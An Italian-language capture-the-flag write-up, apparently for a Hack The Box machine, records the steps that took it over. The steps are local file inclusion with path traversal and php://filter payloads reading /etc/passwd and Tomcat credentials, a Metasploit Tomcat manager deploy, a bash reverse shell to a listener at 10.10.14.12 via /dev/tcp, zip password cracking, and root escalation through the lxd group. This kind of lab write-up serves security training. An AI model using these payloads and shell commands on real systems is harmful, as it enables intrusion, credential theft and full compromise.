@@ -1,0 +1,109 @@
+Vado a vedere il sito, nulla di interessante ma vedo un domain name.
+Lo posso aggiungere all'/etc/hosts
+
+Trovo files con scan di gobuster. Penso ad una file inclusion
+Da internet un php filter strutturato nel seguente modo
+vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
+
+Il link completo diventerà 
+http://megahosting.htb/news.php?file=php://filter/convert.base64-encode/resource=statement 
+
+Non funziona. Pero' trovo qualcosa in
+http://megahosting.htb/news.php?file=php://filter/convert.base64-encode/resource=../news.php
+
+La pagina è vuota ma view source code mostra qualcosa
+Capisco quindi che ../ funziona. Riprovo con /etc/passwd
+
+http://megahosting.htb/news.php?file=../../../../../../../../etc/passwd 
+E posso leggere il contenuto
+
+Intanto provo anche la porta di Tomcat e vedo una pagina iniziale di tomcat.
+Per accedere alla webapp mi servono delle credenziali
+
+C'è un tool su metasploit che prova ad entrare su tomcat
+Apro msfconsol e lo uso
+scanner/http/tomcat_mgr_login
+setto rhosts ma non trovo nulla
+
+Dal manager mi dice che le credenziali si trovano in conf/tomcat-users.xml
+Provo ad accedere lì
+
+Non riesco, non capisco dove sia il file .xml
+Provo con wFuzz
+wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://megahosting.htb/news.php?file=../../../../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml
+
+Vuol dire che sostituisce a FUZZ tutte le parole nella wordlist e ne cerca una che vada bene.
+Sto cercando un percorso
+
+In parallelo aggiungo | grep -v "0 L"
+Ossia mostro solo quelle linee che NON hanno 0L ossia lunghezza 0 nella risposta
+comando completo
+wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://megahosting.htb/news.php?file=../../../../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml | grep -v "0 L"
+
+Ne trovo uno con /etc/
+Provo ad accedere da broswer a 
+megahosting.htb/news.php?file=../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
+
+E con il view source riesco finalmente a leggere
+trovo username e password
+Provo ad accedere ma sono sempre unauthorised
+Riesco pero' ad accedere all'host webapp
+
+Il ruolo è manager-script.
+Posso fare un exploit cercando da google
+Da metasploit uso tomcat_mgr_deploy
+Setto lhost, lport, rhosts, rport, username e password
+Non funziona
+Devo settare anche da PATH
+Lo so cercando l'exploit su google, è:
+set PATH /manager/text
+
+Stavolta funziona, sono dentro con meterpreter
+Voglio una shell migliore, uso pwncat
+Vado su pwncat e lancio
+source pwncat-env/bin/activate
+python -m pwncat -lp 8888
+
+Da meterpreter, uso bash e utilizzo
+bash -c 'bash -i>& /dev/tcp/10.10.14.12/8888 0>&1'
+Ho due interfacce, remote e local. In remote posso usare una shell completa normalmente
+In local posso downloadare file
+cambio interfaccia con Ctrl+D
+Vado in /var/www/html/files e trovo un backup.zip
+Lo scarico con download file da local
+
+Serve una password, provo con fcrackzip
+fcrackzip -uDp /usr/share/wordlists/rockyou.txt 16162020_backup.zip
+
+Trovata la password e scaricati i file ma non trovo nulla di che 
+Provo pero' a passare all'user ash con quella password che ho trovato e sorprendentemente riesco
+
+PRIVESC
+
+Da local posso usare
+use enumerate.gather 
+Per prendere un po' di info
+Invio anche linPEAS, basta usare, in locale, :
+uploads /home/sjay/Tools/linpeas.sh
+
+Trova lxd come group.
+lxd privesc sempre disponibile
+Procedo con quello
+
+Prima cosa:
+lxc list
+Devo usare 
+/snap/bin/lxc list
+Devo crearne uno
+
+Cerco da google e ci sono molti script
+Prendo il più affidabile e scarico pure l'immagine alpine con il comando
+wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
+
+nella mia macchina locale
+Lancio il file scaricato e scarico tutto per creare la immagine alpine
+uploado l'immagine alpine e lo script sh
+Lo posso lanciare con
+./lxc_privesc.sh -f alpine-v3.17-x86_64-20230403_1357.tar.gz
+
+Sono dentro come root
